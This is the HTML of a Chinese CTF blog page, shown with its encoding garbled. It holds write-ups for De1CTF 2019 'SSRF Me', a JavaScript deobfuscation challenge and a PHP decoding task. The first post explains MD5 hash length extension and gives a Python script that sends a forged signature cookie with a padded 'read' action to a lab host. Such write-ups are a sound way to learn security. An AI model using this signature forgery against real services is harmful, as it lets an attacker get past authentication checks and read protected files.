<p>æƒ³readå°±è¦ä¼ªé€ ç­¾åï¼Œè¿™é‡Œå­˜åœ¨ä¸€ç§æ”»å‡»æ–¹å¼ï¼š</p>
<h5 id="å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»"><a href="#å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»" class="headerlink" title="å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»"></a><strong>å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»</strong></h5><p>æƒ³è¦äº†è§£è¿™ç§æ”»å‡»æ–¹å¼ï¼Œå°±è¦äº†è§£å“ˆå¸Œï¼š</p>
<h6 id="1-HASH"><a href="#1-HASH" class="headerlink" title="1.HASH:"></a>1.HASH:</h6><p>Hashï¼Œä¸€èˆ¬ç¿»è¯‘åšæ•£åˆ—ã€æ‚å‡‘ï¼Œæˆ–éŸ³è¯‘ä¸ºå“ˆå¸Œï¼Œæ˜¯æŠŠä»»æ„é•¿åº¦çš„<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E8%BE%93%E5%85%A5/5481954">è¾“å…¥</a>ï¼ˆåˆå«åšé¢„æ˜ å°„pre-imageï¼‰é€šè¿‡æ•£åˆ—ç®—æ³•å˜æ¢æˆå›ºå®šé•¿åº¦çš„<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E8%BE%93%E5%87%BA/11056752">è¾“å‡º</a>ï¼Œè¯¥è¾“å‡ºå°±æ˜¯æ•£åˆ—å€¼ã€‚ç®€å•çš„è¯´å°±æ˜¯ä¸€ç§å°†ä»»æ„é•¿åº¦çš„æ¶ˆæ¯å‹ç¼©åˆ°æŸä¸€å›ºå®šé•¿åº¦çš„<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%B6%88%E6%81%AF%E6%91%98%E8%A6%81/4547744">æ¶ˆæ¯æ‘˜è¦</a>çš„å‡½æ•°ã€‚åŸºäºMerkleâ€“DamgÃ¥rdç»“æ„ã€‚</p>
<h6 id="2-ä¾‹å¦‚ï¼šMD5"><a href="#2-ä¾‹å¦‚ï¼šMD5" class="headerlink" title="2.ä¾‹å¦‚ï¼šMD5"></a>2.ä¾‹å¦‚ï¼šMD5</h6><p>ä¸€èˆ¬md5åœ¨ç­¾åæ—¶ä¼šæ˜¯è¿™æ ·çš„ï¼š</p>
<p><strong>md5ï¼ˆkey+dataï¼‰</strong></p>
<p>æˆ‘ä»¬ä¸çŸ¥é“keyï¼Œä½†æ˜¯dataæ˜¯å¯ä»¥æ§åˆ¶çš„</p>
<p>å¦‚æœåŒæ—¶æˆ‘ä»¬çŸ¥é“äº†keyçš„é•¿åº¦å°±å¯ä»¥<strong>æ— éœ€key</strong>ï¼Œè®¡ç®—å‡º<strong>md5ï¼ˆkey+data+attachï¼‰</strong></p>
<p><strong>attach</strong>å°±æ˜¯æˆ‘ä»¬ä»»æ„é™„åŠ çš„å­—æ®µã€‚</p>
<p><strong>md5åœ¨åŠ å¯†æ—¶ï¼ŒdataæŒ‰ç…§512ä½åˆ†å—å¤„ç†ï¼Œæœ€åä¸€å—ä¸æ»¡512ä½çš„å¤„ç†ï¼š</strong></p>
<ol>
<li>data+padding+length(data)ï¼šæ€»é•¿åº¦ä¸º64å­—èŠ‚ï¼›</li>
<li>length(data)ï¼š8å­—èŠ‚ï¼Œ64ä½é•¿ï¼Œæè¿°dataåŸå§‹ä¿¡æ¯çš„é•¿åº¦ï¼ŒæŒ‰ç…§å°ç«¯å‚¨å­˜ï¼›</li>
<li>paddingï¼šå¡«å……ï¼Œæ ¹æ®â€œ\80â€+(â€œ\x00â€)*x,ä½¿å¾—è¾¾åˆ°448ä½é•¿åº¦ã€‚</li>
</ol>
<p>è¿™æ ·ï¼Œæ•°æ®å°±å¯ä»¥<strong>åˆ†å—è®¡ç®—</strong>äº†ã€‚</p>
<p>MD5è§„å®šäº†æœ‰<strong>åˆå§‹è®¡ç®—å‘é‡</strong>ï¼Œå‘é‡ä¾æ¬¡ä¸æ¯ä¸ªæ•°æ®å—è®¡ç®—ï¼Œæ¯è®¡ç®—ä¸€æ¬¡ï¼Œå¾—åˆ°<strong>æ–°çš„å‘é‡</strong>ã€‚</p>
<p>æ–°çš„å‘é‡ä¼š<strong>è¦†ç›–</strong>æ‰åˆå§‹å‘é‡ï¼Œæˆä¸ºä¸‹ä¸ªæ•°æ®å—çš„è®¡ç®—å‘é‡ã€‚æœ€åçš„è®¡ç®—å‘é‡å¤„ç†åå°±æ˜¯<strong>æœ€ç»ˆçš„md5å€¼</strong>ã€‚</p>
<p>è€Œæˆ‘ä»¬<strong>å·²çŸ¥</strong>çš„md5(key+data)å°±ç›¸å½“äºå·²çŸ¥<strong>å‰ä¸€ä¸ªæ•°æ®å—è®¡ç®—åå¾—åˆ°çš„è®¡ç®—å‘é‡</strong>ã€‚</p>
<p>åœ¨<strong>keyé•¿åº¦å·²çŸ¥çš„æƒ…å†µä¸‹</strong>ï¼Œæˆ‘ä»¬åªè¦<strong>äººä¸ºè¡¥å……padding</strong>ï¼Œå°±å¯ä»¥ä½¿<strong>attach</strong>æˆä¸ºä¸‹ä¸€ä¸ªæ•°æ®å—å†…å®¹ï¼Œ</p>
<p>åœ¨<strong>keyå‚ä¸ä¸‹</strong>è®¡ç®—çš„å‘é‡ä¸€å®šæ˜¯æ­£ç¡®çš„ï¼Œä¹Ÿå°±ç¡®ä¿æ‹¿<strong>å·²çŸ¥md5</strong>ç»§ç»­è®¡ç®—ä¸‹å»å¾—åˆ°çš„md5æ˜¯æ­£ç¡®çš„ã€‚</p>
<p>æˆ‘ä»¬æ‹¿åˆ°md5å€¼åï¼Œå°±å¯ä»¥å®ŒæˆéªŒè¯ï¼Œå®Œæˆ<strong>å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»</strong>æ”»å‡»äº†ã€‚</p>
<h5 id="hashpump"><a href="#hashpump" class="headerlink" title="hashpump"></a>hashpump</h5><p>emâ€¦â€¦è¿™ä¸ªæœ¬åœ°å®ç°è¿˜æŒºéš¾æçš„â€¦â€¦ï¼Œhashpumpå·¥å…·å¯ä»¥è½»æ¾å®Œæˆè¿™äº›å·¥ä½œğŸ•ï¼</p>
<p><img src="/images/De1CTF-2019-SSRF-Me/image-20210321105703270.png" alt="image-20210321105703270"></p>
<p>ä½¿ç”¨ä¹Ÿååˆ†ç®€ä»‹æ˜äº†ï¼Œå·²çŸ¥md5ï¼Œdataï¼Œkeyçš„é•¿åº¦ï¼Œé™„åŠ å­—æ®µï¼Œå°±å¯ä»¥ç”Ÿæˆå¯¹åº”md5å’Œå¡«å……å¥½çš„æ•°æ®</p>
<h5 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h5><p><img src="/images/De1CTF-2019-SSRF-Me/image-20210321110037572.png" alt="image-20210321110037572"></p>
<p>å¯ä»¥çœ‹åˆ°keyçš„é•¿åº¦ï¼ŒåŒæ—¶æ ¹æ®hintï¼Œparamä¸ºflag.txtï¼Œå…±24ä½ã€‚attachè‡ªç„¶æ˜¯read</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(&#x27;/De1ta&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span>():</span></span><br><span class="line"> action = urllib.unquote(request.cookies.get(<span class="string">&quot;action&quot;</span>))</span><br><span class="line"> param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line"> sign = urllib.unquote(request.cookies.get(<span class="string">&quot;sign&quot;</span>))</span><br><span class="line"> ip = request.remote_addr</span><br><span class="line"> <span class="keyword">if</span> (waf(param)): <span class="keyword">return</span> <span class="string">&quot;No Hacker!!!!&quot;</span></span><br><span class="line"> task = Task(action, param, sign, ip)</span><br><span class="line"> <span class="keyword">return</span> json.dumps(task.Exec()) \</span><br></pre></td></tr></table></figure>

<p>å‘/De1taé¡µé¢çš„cookieå­—æ®µæäº¤signå’Œactionå³å¯ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://9c8d9029-c3f0-495e-a6b1-d806896df4a2.node3.buuoj.cn/De1ta?param=flag.txt&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##å°†ç”Ÿæˆ\xè½¬æ¢æˆ%</span></span><br><span class="line">cookies = &#123;</span><br><span class="line">  <span class="string">&#x27;sign&#x27;</span>: <span class="string">&#x27;2b865fed1aca31784de5754a868533a3&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;action&#x27;</span>:<span class="string">&#x27;scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">res = requests.get(url=url, cookies=cookies)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure>

<p><img src="/images/De1CTF-2019-SSRF-Me/image-20210321110421364.png" alt="image-20210321110421364"></p>
<p>ok</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/18/NaNNaNNaNNaN-Batman/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/header.jpg">
      <meta itemprop="name" content="inanb">
      <meta itemprop="description" content="é“é©¬å†°æ²³å…¥æ¢¦æ¥">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="inanb">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/18/NaNNaNNaNNaN-Batman/" class="post-title-link" itemprop="url">NaNNaNNaNNaN-Batman</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2021-03-18 16:54:41 / ä¿®æ”¹æ—¶é—´ï¼š17:52:18" itemprop="dateCreated datePublished" datetime="2021-03-18T16:54:41+08:00">2021-03-18</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h4 id="NaNNaNNaNNaN-Batman"><a href="#NaNNaNNaNNaN-Batman" class="headerlink" title="NaNNaNNaNNaN-Batman"></a>NaNNaNNaNNaN-Batman</h4><p>é¢˜ç›®åªæœ‰ä¸€ä¸ªé™„ä»¶ï¼šweb100â€¦â€¦</p>
<p>æ‰“å¼€åæ˜¯ä¹±ç ï¼š</p>
<p><img src="D:\HexoBlog\source\images\NaNNaNNaNNaN-Batman\image-20210318165620867.png" alt="image-20210318165620867"></p>
<p><code>_</code>æ˜¯ä¸€ä¸ªfunctionï¼Œåé¢å¯ä»¥çœ‹åˆ°evalï¼ˆ_ï¼‰â€¦â€¦</p>
<p>åœ¨jsä¸­ï¼Œevalæ˜¯ä¸€ä¸ªå¥‡æ€ªçš„å‡½æ•°ï¼š</p>
<blockquote>
<p><strong>JavaScript eval() å‡½æ•°</strong></p>
<p>eval() å‡½æ•°å¯è®¡ç®—æŸä¸ªå­—ç¬¦ä¸²ï¼Œå¹¶æ‰§è¡Œå…¶ä¸­çš„çš„ JavaScript ä»£ç ã€‚</p>
</blockquote>
<p>â€¦â€¦æ€»ä¹‹å°±æŒºå¥‡æ€ªçš„ï¼Œè®¡ç®—å‡ºä¹±ç â€¦â€¦ï¼Œæˆ‘æ‰¾åˆ°äº†GitHubä¸Šçš„å®˜æ–¹wpï¼š</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">To see what code gets evaluated, <span class="keyword">let</span>â€™s replace theevalat the end withconsole.log. This results <span class="keyword">in</span>:</span><br><span class="line"></span><br><span class="line">_ = <span class="string">&#x27;function $()&#123;\x02e=\x04getEle\x0FById(&quot;c&quot;).value;\x0Elength==16\x05^be0f23\x01233ac\x01e98aa$\x01c7be9\x07)&#123;\x02t\bfl\x03s_a\x03i\x03e&#125;\x06n\ba\x03_h0l\x03n\x06r\bg&#123;\x03e\x03_0\x06i\bit\&#x27;\x03_\x03n\x06s=[t,n,r,i];for(\x02o=0;o&lt;13;++o)&#123;\t\x0B[0]);\x0B.splice(0,1)&#125;&#125;&#125;\t\&#x27;&lt;input id=&quot;c&quot;&gt;&lt;\f onclick=$()&gt;Ok&lt;/\f&gt;\&#x27;);delete _\x01\x07\x05\x02var \x03&quot;,&quot;\x04docu\x0F.\x05)\x0Ematch(/\x06&quot;];\x02\x07/)!=null\b=[&quot;\t\x04write(\x0Bs[o%4]\fbutton\x0Eif(e.\x0Fment&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span> (Y <span class="keyword">in</span> $ = <span class="string">&#x27;\x0F\x0E\f\x0B\t\b\x07\x06\x05\x04\x03\x02\x01&#x27;</span>)</span><br><span class="line">  <span class="keyword">with</span> (_.split($[Y]))</span><br><span class="line">    _ = join(pop());</span><br><span class="line"><span class="built_in">eval</span>(_);</span><br></pre></td></tr></table></figure>

<p>\xæ˜¯ä»¥16è¿›åˆ¶è¡¨ç¤ºçš„å­—ç¬¦â€¦â€¦jsä¸æ˜¯å¾ˆç†Ÿæ‚‰</p>
<p>æŠŠä¸å¯é¢„æµ‹çš„evalæ¢æˆalertæ­£ç¡®è§£é‡Šï¼š</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">$</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">var</span> e = <span class="built_in">document</span>.getElementById(<span class="string">&quot;c&quot;</span>).value;</span><br><span class="line">	<span class="keyword">if</span> (e.length == <span class="number">16</span>)</span><br><span class="line">		<span class="keyword">if</span> (e.match(<span class="regexp">/^be0f23/</span>) != <span class="literal">null</span>)</span><br><span class="line">			<span class="keyword">if</span> (e.match(<span class="regexp">/233ac/</span>) != <span class="literal">null</span>)</span><br><span class="line">				<span class="keyword">if</span> (e.match(<span class="regexp">/e98aa$/</span>) != <span class="literal">null</span>)</span><br><span class="line">					<span class="keyword">if</span> (e.match(<span class="regexp">/c7be9/</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">						<span class="keyword">var</span> t = [<span class="string">&quot;fl&quot;</span>, <span class="string">&quot;s_a&quot;</span>, <span class="string">&quot;i&quot;</span>, <span class="string">&quot;e&#125;&quot;</span>];</span><br><span class="line">						<span class="keyword">var</span> n = [<span class="string">&quot;a&quot;</span>, <span class="string">&quot;_h0l&quot;</span>, <span class="string">&quot;n&quot;</span>];</span><br><span class="line">						<span class="keyword">var</span> r = [<span class="string">&quot;g&#123;&quot;</span>, <span class="string">&quot;e&quot;</span>, <span class="string">&quot;_0&quot;</span>];</span><br><span class="line">						<span class="keyword">var</span> i = [<span class="string">&quot;it&#x27;&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;n&quot;</span>];</span><br><span class="line">						<span class="keyword">var</span> s = [t, n, r, i];</span><br><span class="line">						<span class="keyword">for</span> (<span class="keyword">var</span> o = <span class="number">0</span>; o &lt; <span class="number">13</span>; ++o) &#123;</span><br><span class="line">							<span class="built_in">document</span>.write(s[o % <span class="number">4</span>][<span class="number">0</span>]);</span><br><span class="line">							s[o % <span class="number">4</span>].splice(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&#x27;&lt;input id=&quot;c&quot;&gt;&lt;button onclick=$()&gt;Ok&lt;/button&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">delete</span> _</span><br></pre></td></tr></table></figure>

<p>æ»¡è¶³æ¡ä»¶åè®¡ç®—å‡ºflagï¼Œæ¡ä»¶åº”è¯¥æ˜¯éœ€è¦æ‹¼æ¥çš„ï¼Œè®¡ç®—éƒ¨åˆ†å¯¼å…¥æ§åˆ¶å°å‡ºç»“æœï¼š</p>
<p><img src="D:\HexoBlog\source\images\NaNNaNNaNNaN-Batman\image-20210318175207495.png" alt="image-20210318175207495"></p>
<blockquote>
<p>â€¦â€¦</p>
</blockquote>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/18/web2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/header.jpg">
      <meta itemprop="name" content="inanb">
      <meta itemprop="description" content="é“é©¬å†°æ²³å…¥æ¢¦æ¥">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="inanb">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/03/18/web2/" class="post-title-link" itemprop="url">web2</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2021-03-18 16:22:55 / ä¿®æ”¹æ—¶é—´ï¼š16:26:57" itemprop="dateCreated datePublished" datetime="2021-03-18T16:22:55+08:00">2021-03-18</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h5 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h5><h6 id="1-é¢˜ç›®"><a href="#1-é¢˜ç›®" class="headerlink" title="1.é¢˜ç›®"></a>1.é¢˜ç›®</h6><h6 id="2-è¿‡ç¨‹ï¼š"><a href="#2-è¿‡ç¨‹ï¼š" class="headerlink" title="2.è¿‡ç¨‹ï¼š"></a>2.è¿‡ç¨‹ï¼š</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$miwen=<span class="string">&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">    $_o=strrev($str);</span><br><span class="line">    <span class="comment">// echo $_o;</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span>($_0=<span class="number">0</span>;$_0&lt;strlen($_o);$_0++)&#123;</span><br><span class="line">       </span><br><span class="line">        $_c=substr($_o,$_0,<span class="number">1</span>);</span><br><span class="line">        $__=ord($_c)+<span class="number">1</span>;</span><br><span class="line">        $_c=chr($__);</span><br><span class="line">        $_=$_.$_c;   </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> str_rot13(strrev(base64_encode($_)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   é€†å‘åŠ å¯†ç®—æ³•ï¼Œè§£å¯†$miwenå°±æ˜¯flag</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç›´æ¥äº¤ä»£äº†æºç ï¼Œçœ‹è¿‡ä¸Šä¸€ä¸ªæ··æ·†ï¼Œè¿™ä¸ªçœ‹ç€å°±é¡ºçœ¼å¤šäº†</p>
<p>æ ¹æ®ä»£ç ï¼Œå…³é”®ä¹Ÿå°±æ˜¯æˆªå–å­—ç¬¦ä½¿ASCIIç§»ä½ï¼Œæœ€årot13ï¼Œbase64â€¦â€¦</p>
<p>è§£å¯†ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">&quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">	$_o=base64_decode(strrev(str_rot13($str)));</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span>($_0=<span class="number">0</span>;$_0&lt;strlen($_o);$_0++)&#123;</span><br><span class="line">       </span><br><span class="line">        $_c=substr($_o,$_0,<span class="number">1</span>);</span><br><span class="line">        $__=ord($_c)<span class="number">-1</span>;</span><br><span class="line">        $_c=chr($__);</span><br><span class="line">        $_=$_.$_c;   </span><br><span class="line">    &#125; </span><br><span class="line">	$_=strrev($_);</span><br><span class="line">	</span><br><span class="line">    <span class="keyword">return</span> $_;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> decode($a);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/images/web2/image-20210318162648203.png" alt="image-20210318162648203"></p>
<p>okâ€¦â€¦</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="ä¸Šä¸€é¡µ"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="ä¸‹ä¸€é¡µ"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          æ–‡ç« ç›®å½•
        </li>
        <li class="sidebar-nav-overview">
          ç«™ç‚¹æ¦‚è§ˆ
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="inanb"
      src="/images/header.jpg">
  <p class="site-author-name" itemprop="name">inanb</p>
  <div class="site-description" itemprop="description">é“é©¬å†°æ²³å…¥æ¢¦æ¥</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">78</span>
          <span class="site-state-item-name">æ—¥å¿—</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">4</span>
        <span class="site-state-item-name">åˆ†ç±»</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">8</span>
        <span class="site-state-item-name">æ ‡ç­¾</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">inanb</span>
</div>
  <div class="powered-by">ç”± <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> å¼ºåŠ›é©±åŠ¨
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  


<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>

</body>
</html>
